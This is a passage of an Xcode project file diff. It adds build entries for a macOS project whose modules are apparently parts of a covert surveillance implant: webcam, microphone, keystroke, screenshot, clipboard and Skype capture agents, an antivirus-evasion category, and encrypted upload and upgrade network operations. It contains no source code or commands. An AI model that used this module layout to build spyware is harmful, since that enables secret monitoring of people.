+		52D836271393916B00C18E70 /* libxpcom.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 52D836231393916B00C18E70 /* libxpcom.dylib */; };
+		52D836281393916B00C18E70 /* libxpcomglue_s.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 52D836241393916B00C18E70 /* libxpcomglue_s.a */; };
+		8D11072B0486CEB800E47090 /* InfoPlist.strings in Resources */ = {isa = PBXBuildFile; fileRef = 089C165CFE840E0CC02AAC07 /* InfoPlist.strings */; };
+		8D11072D0486CEB800E47090 /* RCSMMain.m in Sources */ = {isa = PBXBuildFile; fileRef = 29B97316FDCFA39411CA2CEA /* RCSMMain.m */; settings = {ATTRIBUTES = (); }; };
+		8D11072F0486CEB800E47090 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
+		C52FEF4116FC596200DCBF2A /* __m_Social_Module.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4016FC596200DCBF2A /* __m_Social_Module.m */; };
+		C52FEF4516FC59C900DCBF2A /* __m_Social.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4416FC59C900DCBF2A /* __m_Social.m */; };
+		C52FEF4816FC5A0E00DCBF2A /* __m_Social_Facebook.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4716FC5A0E00DCBF2A /* __m_Social_Facebook.m */; };
+		CC27338216B7D1D100DCD0E4 /* CommandsNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = CC27338116B7D1D100DCD0E4 /* CommandsNetworkOperation.m */; };
+		CC31C81016DCB5FB00922BD6 /* RCSMTask.m in Sources */ = {isa = PBXBuildFile; fileRef = CC31C80F16DCB5FB00922BD6 /* RCSMTask.m */; };
+		CC3718B016DE0EFA00658703 /* libsqlite3.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = CC3718AF16DE0EFA00658703 /* libsqlite3.dylib */; };
+		CCB619EC185F3B3B003B7D3E /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */ = {isa = PBXBuildFile; fileRef = CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */; };
+		CCD43B5C18EC00AC005B2B67 /* RCSMAgentMessages.m in Sources */ = {isa = PBXBuildFile; fileRef = CCD43B5B18EC00AC005B2B67 /* RCSMAgentMessages.m */; };
+		CCE74A80185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */ = {isa = PBXBuildFile; fileRef = CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */; };
+		CCFFD70615D8ED6E00131597 /* RCSMGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CCFFD70515D8ED6E00131597 /* RCSMGlobals.m */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		523DEC9515186C1300DCC65F /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 29B97313FDCFA39411CA2CEA /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 1AF610080FA72D87003F2C12;
+			remoteInfo = RCSMInputManager;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		089C165DFE840E0CC02AAC07 /* English */ = {isa = PBXFileReference; fileEncoding = 10; lastKnownFileType = text.plist.strings; name = English; path = English.lproj/InfoPlist.strings; sourceTree = "<group>"; };
+		1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Cocoa.framework; path = /System/Library/Frameworks/Cocoa.framework; sourceTree = "<absolute>"; };
+		1A00BFAD1302D33700783D4E /* RCSMAgentOrganizerTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentOrganizerTest.m; path = Tests/RCSMAgentOrganizerTest.m; sourceTree = "<group>"; };
+		1A10795612E720ED0063759B /* Tests.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Tests.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		1A10795A12E720ED0063759B /* Tests-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "Tests-Info.plist"; sourceTree = "<group>"; };
+		1A10797212E721850063759B /* GHUnit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = GHUnit.framework; path = Library/Frameworks/GHUnit.framework; sourceTree = SDKROOT; };
+		1A10798812E722590063759B /* GHUnitTestMain.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = GHUnitTestMain.m; path = Tests/GHUnitTestMain.m; sourceTree = "<group>"; };
+		1A10798D12E722AB0063759B /* RESTNetworkProtocolTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RESTNetworkProtocolTest.m; path = Tests/RESTNetworkProtocolTest.m; sourceTree = "<group>"; };
+		1A107BD112E730800063759B /* AuthNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = AuthNetworkOperationTest.m; path = Tests/AuthNetworkOperationTest.m; sourceTree = "<group>"; };
+		1A107BF512E737060063759B /* RESTTransportTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RESTTransportTest.m; path = Tests/RESTTransportTest.m; sourceTree = "<group>"; };
+		1A12A0171091FE8C0090C4D7 /* RCSMAgentVoipSkype.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentVoipSkype.h; path = Agents/RCSMAgentVoipSkype.h; sourceTree = "<group>"; };
+		1A12A0181091FE8C0090C4D7 /* RCSMAgentVoipSkype.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentVoipSkype.m; path = Agents/RCSMAgentVoipSkype.m; sourceTree = "<group>"; };
+		1A12A0BD1095A99F0090C4D7 /* CoreAudio.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreAudio.framework; path = System/Library/Frameworks/CoreAudio.framework; sourceTree = SDKROOT; };
+		1A12A0F11095BD350090C4D7 /* QTKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = QTKit.framework; path = System/Library/Frameworks/QTKit.framework; sourceTree = SDKROOT; };
+		1A12A14F1095F24C0090C4D7 /* mach_override.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; name = mach_override.mm; path = Support/mach_override.mm; sourceTree = "<group>"; };
+		1A12A1501095F24C0090C4D7 /* mach_override.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = mach_override.h; path = Support/mach_override.h; sourceTree = "<group>"; };
+		1A13FE4412F9B4F800B82938 /* RCSMLogger.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMLogger.h; path = Support/RCSMLogger.h; sourceTree = "<group>"; };
+		1A13FE4512F9B4F800B82938 /* RCSMLogger.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMLogger.m; path = Support/RCSMLogger.m; sourceTree = "<group>"; };
+		1A13FE4C12F9B6B300B82938 /* RCSMDebug.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMDebug.h; path = Support/RCSMDebug.h; sourceTree = "<group>"; };
+		1A1A2FCF10611067001F1B5D /* RCSMAgentWebcam.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentWebcam.m; path = Agents/RCSMAgentWebcam.m; sourceTree = "<group>"; };
+		1A1A2FD110611075001F1B5D /* RCSMAgentWebcam.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentWebcam.h; path = Agents/RCSMAgentWebcam.h; sourceTree = "<group>"; };
+		1A1A2FDE106112CF001F1B5D /* QuickTime.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = QuickTime.framework; path = System/Library/Frameworks/QuickTime.framework; sourceTree = SDKROOT; };
+		1A1B9CD50FA091970036558C /* spref.icns */ = {isa = PBXFileReference; lastKnownFileType = image.icns; path = spref.icns; sourceTree = "<group>"; };
+		1A1B9D390FA0AD670036558C /* RCSMAgentScreenshot.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentScreenshot.h; path = Agents/RCSMAgentScreenshot.h; sourceTree = "<group>"; };
+		1A1B9D3A0FA0AD670036558C /* RCSMAgentScreenshot.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentScreenshot.m; path = Agents/RCSMAgentScreenshot.m; sourceTree = "<group>"; };
+		1A1B9D6A0FA0B4BB0036558C /* RCSMLogManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMLogManager.h; path = Modules/RCSMLogManager.h; sourceTree = "<group>"; };
+		1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMLogManager.m; path = Modules/RCSMLogManager.m; sourceTree = "<group>"; };
+		1A281C970FF3CAC800616589 /* RCSMAgentClipboard.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentClipboard.m; path = Agents/RCSMAgentClipboard.m; sourceTree = "<group>"; };
+		1A281C980FF3CAC800616589 /* RCSMAgentClipboard.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentClipboard.h; path = Agents/RCSMAgentClipboard.h; sourceTree = "<group>"; };
+		1A28786C12F062A80008973A /* UploadNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = UploadNetworkOperationTest.m; path = Tests/UploadNetworkOperationTest.m; sourceTree = "<group>"; };
+		1A28798512F080B20008973A /* FSNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = FSNetworkOperationTest.m; path = Tests/FSNetworkOperationTest.m; sourceTree = "<group>"; };
+		1A319EE30FA9B6410079B060 /* RCSMInputManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMInputManager.h; path = InputManager/RCSMInputManager.h; sourceTree = "<group>"; };
+		1A319EE40FA9B6410079B060 /* RCSMInputManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMInputManager.m; path = InputManager/RCSMInputManager.m; sourceTree = "<group>"; };
+		1A319F080FA9C8260079B060 /* Info */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = Info; sourceTree = "<group>"; };
+		1A33F8EA0FCC1EB000590FA1 /* RCSMEvents.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMEvents.h; path = Modules/RCSMEvents.h; sourceTree = "<group>"; };
+		1A33F8EB0FCC1EB000590FA1 /* RCSMEvents.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMEvents.m; path = Modules/RCSMEvents.m; sourceTree = "<group>"; };
+		1A356B9F109F3EB30063AF34 /* speex.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex.h; path = Support/Speex/speex.h; sourceTree = "<group>"; };
+		1A356BA0109F3EB30063AF34 /* speex_bits.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_bits.h; path = Support/Speex/speex_bits.h; sourceTree = "<group>"; };
+		1A356BA1109F3EB30063AF34 /* speex_buffer.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_buffer.h; path = Support/Speex/speex_buffer.h; sourceTree = "<group>"; };
+		1A356BA2109F3EB30063AF34 /* speex_callbacks.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_callbacks.h; path = Support/Speex/speex_callbacks.h; sourceTree = "<group>"; };
+		1A356BA3109F3EB30063AF34 /* speex_config_types.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_config_types.h; path = Support/Speex/speex_config_types.h; sourceTree = "<group>"; };
+		1A356BA4109F3EB30063AF34 /* speex_echo.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_echo.h; path = Support/Speex/speex_echo.h; sourceTree = "<group>"; };
+		1A356BA5109F3EB30063AF34 /* speex_header.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_header.h; path = Support/Speex/speex_header.h; sourceTree = "<group>"; };
+		1A356BA6109F3EB30063AF34 /* speex_jitter.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_jitter.h; path = Support/Speex/speex_jitter.h; sourceTree = "<group>"; };
+		1A356BA7109F3EB30063AF34 /* speex_preprocess.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_preprocess.h; path = Support/Speex/speex_preprocess.h; sourceTree = "<group>"; };
+		1A356BA8109F3EB30063AF34 /* speex_resampler.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_resampler.h; path = Support/Speex/speex_resampler.h; sourceTree = "<group>"; };
+		1A356BA9109F3EB30063AF34 /* speex_stereo.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_stereo.h; path = Support/Speex/speex_stereo.h; sourceTree = "<group>"; };
+		1A356BAA109F3EB30063AF34 /* speex_types.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = speex_types.h; path = Support/Speex/speex_types.h; sourceTree = "<group>"; };
+		1A40F7C712DF071C00BEACB8 /* AuthNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = AuthNetworkOperation.h; path = Modules/AuthNetworkOperation.h; sourceTree = "<group>"; };
+		1A40F7C812DF071C00BEACB8 /* AuthNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = AuthNetworkOperation.m; path = Modules/AuthNetworkOperation.m; sourceTree = "<group>"; };
+		1A40F7DF12DF107900BEACB8 /* Transport.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = Transport.h; path = Modules/Transport.h; sourceTree = "<group>"; };
+		1A40F81612DF293A00BEACB8 /* RESTTransport.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RESTTransport.h; path = Modules/RESTTransport.h; sourceTree = "<group>"; };
+		1A40F81712DF293A00BEACB8 /* RESTTransport.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RESTTransport.m; path = Modules/RESTTransport.m; sourceTree = "<group>"; };
+		1A43C9650FFA641A008E5EFE /* IOKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = IOKit.framework; path = /System/Library/Frameworks/IOKit.framework; sourceTree = "<absolute>"; };
+		1A4434830F8B950B00CD910E /* RCSMConfManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMConfManager.h; path = Modules/RCSMConfManager.h; sourceTree = "<group>"; };
+		1A4434840F8B950B00CD910E /* RCSMConfManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMConfManager.m; path = Modules/RCSMConfManager.m; sourceTree = "<group>"; };
+		1A4434D50F8C907000CD910E /* RCSMEncryption.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMEncryption.h; path = Modules/RCSMEncryption.h; sourceTree = "<group>"; };
+		1A4434D60F8C907000CD910E /* RCSMEncryption.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMEncryption.m; path = Modules/RCSMEncryption.m; sourceTree = "<group>"; };
+		1A4435210F8CA23E00CD910E /* NSMutableData+AES128.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSMutableData+AES128.h"; path = "Categories/NSMutableData+AES128.h"; sourceTree = "<group>"; };
+		1A4435220F8CA23E00CD910E /* NSMutableData+AES128.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSMutableData+AES128.m"; path = "Categories/NSMutableData+AES128.m"; sourceTree = "<group>"; };
+		1A4435470F8CB10800CD910E /* NSString+SHA1.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSString+SHA1.h"; path = "Categories/NSString+SHA1.h"; sourceTree = "<group>"; };
+		1A4435480F8CB10800CD910E /* NSString+SHA1.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSString+SHA1.m"; path = "Categories/NSString+SHA1.m"; sourceTree = "<group>"; };
+		1A4436570F8CD55400CD910E /* RCSMCommon.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMCommon.h; sourceTree = "<group>"; };
+		1A4436580F8CD55400CD910E /* RCSMCommon.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSMCommon.m; sourceTree = "<group>"; };
+		1A508A9B11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSMutableDictionary+ThreadSafe.h"; path = "Categories/NSMutableDictionary+ThreadSafe.h"; sourceTree = "<group>"; };
+		1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSMutableDictionary+ThreadSafe.m"; path = "Categories/NSMutableDictionary+ThreadSafe.m"; sourceTree = "<group>"; };
+		1A508AD111A692260067BF81 /* RCSMDesktopImage.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMDesktopImage.h; sourceTree = "<group>"; };
+		1A508B0411A6B1F20067BF81 /* Carbon.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Carbon.framework; path = System/Library/Frameworks/Carbon.framework; sourceTree = SDKROOT; };
+		1A521EC412FAB9550091ADD5 /* UpgradeNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = UpgradeNetworkOperationTest.m; path = Tests/UpgradeNetworkOperationTest.m; sourceTree = "<group>"; };
+		1A521EC812FABAC00091ADD5 /* UpgradeNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = UpgradeNetworkOperation.h; path = Modules/UpgradeNetworkOperation.h; sourceTree = "<group>"; };
+		1A521EC912FABAC00091ADD5 /* UpgradeNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = UpgradeNetworkOperation.m; path = Modules/UpgradeNetworkOperation.m; sourceTree = "<group>"; };
+		1A5509AF13618F9A00D1A2AD /* RCSMAgentFileCapture.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentFileCapture.h; path = Agents/RCSMAgentFileCapture.h; sourceTree = "<group>"; };
+		1A5509B013618F9A00D1A2AD /* RCSMAgentFileCapture.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentFileCapture.m; path = Agents/RCSMAgentFileCapture.m; sourceTree = "<group>"; };
+		1A5B320C12E4A2AF00677A0B /* Transport.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = Transport.m; path = Modules/Transport.m; sourceTree = "<group>"; };
+		1A65115612DDC99100D4F1AF /* IDNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = IDNetworkOperation.h; path = Modules/IDNetworkOperation.h; sourceTree = "<group>"; };
+		1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = IDNetworkOperation.m; path = Modules/IDNetworkOperation.m; sourceTree = "<group>"; };
+		1A65115912DDC9B500D4F1AF /* ConfNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = ConfNetworkOperation.h; path = Modules/ConfNetworkOperation.h; sourceTree = "<group>"; };
+		1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = ConfNetworkOperation.m; path = Modules/ConfNetworkOperation.m; sourceTree = "<group>"; };
+		1A65115C12DDC9E200D4F1AF /* DownloadNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = DownloadNetworkOperation.h; path = Modules/DownloadNetworkOperation.h; sourceTree = "<group>"; };
+		1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = DownloadNetworkOperation.m; path = Modules/DownloadNetworkOperation.m; sourceTree = "<group>"; };
+		1A65115F12DDCA1900D4F1AF /* UploadNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = UploadNetworkOperation.h; path = Modules/UploadNetworkOperation.h; sourceTree = "<group>"; };
+		1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = UploadNetworkOperation.m; path = Modules/UploadNetworkOperation.m; sourceTree = "<group>"; };
+		1A65116212DDCA4600D4F1AF /* FSNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = FSNetworkOperation.h; path = Modules/FSNetworkOperation.h; sourceTree = "<group>"; };
+		1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = FSNetworkOperation.m; path = Modules/FSNetworkOperation.m; sourceTree = "<group>"; };
+		1A65116512DDCA5700D4F1AF /* LogNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = LogNetworkOperation.h; path = Modules/LogNetworkOperation.h; sourceTree = "<group>"; };
+		1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = LogNetworkOperation.m; path = Modules/LogNetworkOperation.m; sourceTree = "<group>"; };
+		1A65116812DDCA6C00D4F1AF /* ByeNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = ByeNetworkOperation.h; path = Modules/ByeNetworkOperation.h; sourceTree = "<group>"; };
+		1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = ByeNetworkOperation.m; path = Modules/ByeNetworkOperation.m; sourceTree = "<group>"; };
+		1A68E04E0FB881DD00B17F60 /* RCSMAgentIMSkype.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentIMSkype.h; path = Agents/RCSMAgentIMSkype.h; sourceTree = "<group>"; };
+		1A68E04F0FB881DD00B17F60 /* RCSMAgentIMSkype.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentIMSkype.m; path = Agents/RCSMAgentIMSkype.m; sourceTree = "<group>"; };
+		1A68E1510FB9A3B800B17F60 /* RCSMAgentInputLogger.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentInputLogger.h; path = Agents/RCSMAgentInputLogger.h; sourceTree = "<group>"; };
+		1A68E1520FB9A3B800B17F60 /* RCSMAgentInputLogger.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentInputLogger.m; path = Agents/RCSMAgentInputLogger.m; sourceTree = "<group>"; };
+		1A68E36E0FBB1F3200B17F60 /* RCSMAgentURL.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentURL.h; path = Agents/RCSMAgentURL.h; sourceTree = "<group>"; };
+		1A68E36F0FBB1F3200B17F60 /* RCSMAgentURL.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentURL.m; path = Agents/RCSMAgentURL.m; sourceTree = "<group>"; };
+		1A7A94140FE13EC7007FF947 /* RCSMActions.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMActions.h; path = Modules/RCSMActions.h; sourceTree = "<group>"; };
+		1A7A94150FE13EC7007FF947 /* RCSMActions.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMActions.m; path = Modules/RCSMActions.m; sourceTree = "<group>"; };
+		1A7FD31812F17EED00361B0B /* LogNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = LogNetworkOperationTest.m; path = Tests/LogNetworkOperationTest.m; sourceTree = "<group>"; };
+		1A7FD33E12F1841200361B0B /* NSData+SHA1.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSData+SHA1.h"; path = "Categories/NSData+SHA1.h"; sourceTree = "<group>"; };
+		1A7FD33F12F1841200361B0B /* NSData+SHA1.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSData+SHA1.m"; path = "Categories/NSData+SHA1.m"; sourceTree = "<group>"; };
+		1A7FD43B12F1CED900361B0B /* RCSMFileSystemManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMFileSystemManager.h; path = Modules/RCSMFileSystemManager.h; sourceTree = "<group>"; };
+		1A7FD43C12F1CED900361B0B /* RCSMFileSystemManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMFileSystemManager.m; path = Modules/RCSMFileSystemManager.m; sourceTree = "<group>"; };
+		1A7FD44012F1D28100361B0B /* RCSMFileSystemManagerTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMFileSystemManagerTest.m; path = Tests/RCSMFileSystemManagerTest.m; sourceTree = "<group>"; };
+		1A8CB94C132665D1005579F9 /* RCSMAgentMicrophone.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentMicrophone.h; path = Agents/RCSMAgentMicrophone.h; sourceTree = "<group>"; };
+		1A8CB94D132665D1005579F9 /* RCSMAgentMicrophone.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentMicrophone.m; path = Agents/RCSMAgentMicrophone.m; sourceTree = "<group>"; };
+		1A8CB952132666E5005579F9 /* AudioToolbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AudioToolbox.framework; path = System/Library/Frameworks/AudioToolbox.framework; sourceTree = SDKROOT; };
+		1A8CB95513278ECB005579F9 /* RCSMAgentMicrophoneTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentMicrophoneTest.m; path = Tests/RCSMAgentMicrophoneTest.m; sourceTree = "<group>"; };
+		1A8CB9581327928B005579F9 /* AudioToolbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AudioToolbox.framework; path = System/Library/Frameworks/AudioToolbox.framework; sourceTree = SDKROOT; };
+		1AA84480113C22FE005FBADB /* libspeex.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libspeex.a; path = Support/Speex/libspeex.a; sourceTree = "<group>"; };
+		1AA84484113C26D1005FBADB /* libz.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = libz.a; sourceTree = "<group>"; };
+		1AAF6FC812FB0A7E00D3E581 /* RCSMLoggerTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMLoggerTest.m; path = Tests/RCSMLoggerTest.m; sourceTree = "<group>"; };
+		1AB5DC3F11CF9DE600B9E32B /* NSApplication+SystemVersion.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSApplication+SystemVersion.h"; path = "Categories/NSApplication+SystemVersion.h"; sourceTree = "<group>"; };
